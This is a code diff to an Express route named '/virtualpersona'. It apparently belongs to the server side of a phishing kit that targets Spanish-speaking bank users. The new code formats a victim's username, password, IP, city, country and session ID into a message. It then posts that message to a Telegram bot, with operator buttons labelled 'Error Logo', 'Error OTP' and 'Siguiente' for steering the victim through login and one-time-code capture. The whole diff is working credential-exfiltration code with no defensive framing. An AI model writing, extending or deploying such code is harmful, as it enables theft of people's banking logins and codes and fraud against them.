@@ -106,19 +106,27 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
-const message = `<b>📲 NUEVO ACCESO VIRTUAL</b>
+const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`; 
 
-${fmt('👤 Usuario', user)}
-${fmt('🔑 Clave', pass)}
-${fmt('🌐 IP', ip)}
-${fmt('🌎 País', country)}
-${fmt('🏘️ Ciudad', city)}
-
-<b>SessionID:</b> <code>${sessionId}</code>
-⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
-
-await tgSendMessage(message, buttonsForStep('virtual', sessionId));
-
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    chat_id: CHAT_ID,
+    text: message,
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "🔁 Error Logo", callback_data: `error_logo_${sessionId}` },
+          { text: "🔁 Error OTP", callback_data: `error_otp_${sessionId}` }
+        ],
+        [
+          { text: "✅ Siguiente", callback_data: `siguiente_${sessionId}` }
+        ]
+      ]
+    }
+  })
+});
 
 
 
